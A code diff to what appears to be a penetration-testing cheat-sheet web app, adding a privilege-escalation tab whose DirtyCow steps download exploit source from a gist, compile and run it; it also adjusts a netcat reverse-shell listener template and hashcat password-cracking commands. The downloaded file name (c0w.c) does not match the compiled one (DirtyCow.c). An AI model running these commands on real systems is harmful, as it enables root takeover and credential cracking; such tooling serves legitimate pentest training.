@@ -85,6 +85,20 @@ $(function () {
   osint.setup(osintRhost);
   osint.draw(osintRhost);
 
+  // --- Setup privilege escalation list ---
+  STORAGE_KEY = 'PRIVESC_ENV';
+  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
+  const privescLhost = (storageInfo && storageInfo.LHOST) || '10.0.0.1';
+  const privescLport = (storageInfo && storageInfo.LPORT) || '4444';
+  const privesc = new PrivEsc('#mytoolPrivEsc', ['#privescLinuxList'], {
+    'LHOST': '#privescInputLHOST',
+    'LPORT': '#privescInputLPORT',
+    'SUBMIT': '#privescInputSubmit',
+  })
+  privesc.STORAGE_KEY = STORAGE_KEY;
+  privesc.setup(privescLhost, privescLport);
+  privesc.draw(privescLhost, privescLport);
+
 
   // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
   const myTabButton = document.querySelector(`#myTab button[data-bs-target="${location.hash}"]`);
@@ -234,7 +248,7 @@ class RevShell extends MyTool {
 
     // 1. Listen
     this.targetContents['1.Listen'] = [
-      {'title': '@Kali (netcat)', 'cmd': 'nc -lnvp {0}'},
+      {'title': '@Kali (netcat)', 'cmd': 'nc -lnvp {1}'},
     ];
 
     // 2. Connect back
@@ -482,7 +496,7 @@ class PassCrack extends MyTool {
       {'title': 'Hybrid Mode (Prepend)', 'cmd': `hashcat -a 6 -m HASHMODE {0} -1=012 '20?1?d' /usr/share/wordlists/rockyou.txt`, 'memo': '2015Password'},
       {'title': 'Hybrid Mode (Append)', 'cmd': `hashcat -a 7 -m HASHMODE {0} -1=012 '20?1?d' /usr/share/wordlists/rockyou.txt`, 'memo': 'Password2015'},
       {'title': 'Hashcat Rule', 'cmd': 'hashcat -a 0 -m HASHMODE {0} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule'},
-      {'title': '1. Create Custom Hashcat Rule', 'cmd': `echo 'so0 si1 se3 ss5 sa@ c $2 $0 $1 $9' > rule.txt`, 'memo': '<ul><li>l = Convert all letters to lowercase</li><li>u = Convert all letters to uppercase</li><li>c = Capitalize first letter and invert the rest</li><li>^X = Prepend character X</li><li>$X = Append character X</li><li>r = Reverse</li></ul>'},
+      { 'title': '1. Create Custom Hashcat Rule', 'cmd': `echo 'so0 si1 se3 ss5 sa@ c $2 $0 $1 $9' > rule.txt`, 'memo': '<ul><li>l = Convert all letters to lowercase</li><li>u = Convert all letters to uppercase</li><li>c = Capitalize first letter and invert the rest</li><li>^X = Prepend character X</li><li>$X = Append character X</li><li>sXY = Substitute letter from X to Y</li><li>r = Reverse</li></ul>'},
       {'title': '2. Apply Custom Hashcat Rule', 'cmd': 'hashcat -a 0 -m HASHMODE {0} /usr/share/wordlists/rockyou.txt -r rule.txt'},
     ];
   }
@@ -537,6 +551,39 @@ class Osint extends MyTool {
       let title = content.title;
       let cmd = content.cmd;
       cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
+      // Template
+      $(this.targetCSSSelectors[index]).append(`
+      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
+        <div class="ms-2 me-auto" style="width: 80%">
+          <div class="fw-bold">${title}</div>
+          <code class="copy_target">${cmd}</code>
+        </div>
+        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
+      </li>
+      `);
+    }
+  }
+}
+
+// ---- Privilege Escalation ---------------------------------------------------
+class PrivEsc extends MyTool {
+  constructor(...args) {
+    super(...args);
+
+    this.targetContents['1'] = [
+      {'title': '1. DirtyCow', 'cmd': 'wget https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c'},
+      {'title': '2. DirtyCow', 'cmd': 'gcc -pthread DirtyCow.c -o DirtyCow && ./DirtyCow'},
+      {'title': '3. DirtyCow', 'cmd': '/usr/bin/passwd'},
+    ];
+  }
+
+  drawList(index, targetContent, lhost, lport) {
+    for (let i = 0; i < targetContent.length; i++) {
+      const content = targetContent[i];
+      let title = content.title;
+      let cmd = content.cmd;
+      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
+      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
       // Template
       $(this.targetCSSSelectors[index]).append(`
       <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
